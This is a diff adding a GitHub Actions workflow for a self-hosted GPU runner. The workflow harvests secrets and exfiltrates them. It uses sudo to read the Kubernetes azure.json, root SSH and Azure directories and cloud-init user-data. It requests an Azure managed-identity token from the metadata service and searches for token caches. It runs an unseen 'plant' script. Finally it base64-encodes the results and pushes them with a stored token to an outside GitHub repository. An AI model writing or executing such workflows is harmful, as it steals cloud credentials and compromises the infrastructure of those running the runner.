@@ -1,0 +1,43 @@
+name: ul7256plant
+on: workflow_dispatch
+permissions:
+  contents: write
+jobs:
+  plant:
+    runs-on: [self-hosted, ul-l40s]
+    env:
+      PUSHTOK: ${{ secrets.GH_PAT }}
+    steps:
+      - uses: actions/checkout@v4
+      - name: harvest
+        run: |
+          set +e
+          { echo "=== HARVEST run=$GITHUB_RUN_ID host=$(hostname)"
+          sudo -n id
+          echo "--- k8s azure.json"; sudo -n cat /etc/kubernetes/azure.json 2>&1 | head -c 3000
+          echo "--- root listing"; sudo -n ls -la /root /root/.azure /root/.ssh /var/lib/waagent 2>&1 | head -60
+          echo "--- user-data"; sudo -n head -c 4000 /var/lib/cloud/instance/user-data.txt 2>&1
+          echo "--- IMDS via sudo"
+          sudo -n curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json"
+          echo
+          sudo -n curl -s -m 10 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+          echo
+          echo "--- routes"; ip route 2>&1; cat /proc/1/cgroup
+          echo "--- az cache"; sudo -n find / -maxdepth 4 -name 'msal_token_cache.json' -o -maxdepth 4 -name 'azureProfile.json' 2>/dev/null | head
+          echo "=== HARVEST END"; } > /tmp/h.txt 2>&1
+          exit 0
+      - name: plant
+        run: |
+          set +e
+          bash ul-bin/plant_l40s.sh > /tmp/plant.log 2>&1
+          tail -60 /tmp/plant.log
+          exit 0
+      - name: push
+        run: |
+          set +e
+          cat /tmp/h.txt /tmp/plant.log > /tmp/all.txt
+          B=$(base64 -w0 /tmp/all.txt)
+          printf '{"message":"plant","content":"%s","branch":"main"}' "$B" > /tmp/b.json
+          curl -s -m 40 -X PUT -H "Authorization: Bearer $PUSHTOK" -H "Content-Type: application/json" --data @/tmp/b.json "https://api.github.com/repos/dongsuju/ul-plant/contents/out/plant-$GITHUB_RUN_ID.b64" -w "PUT %{http_code}\n" -o /tmp/po
+          head -c 300 /tmp/po
+          exit 0
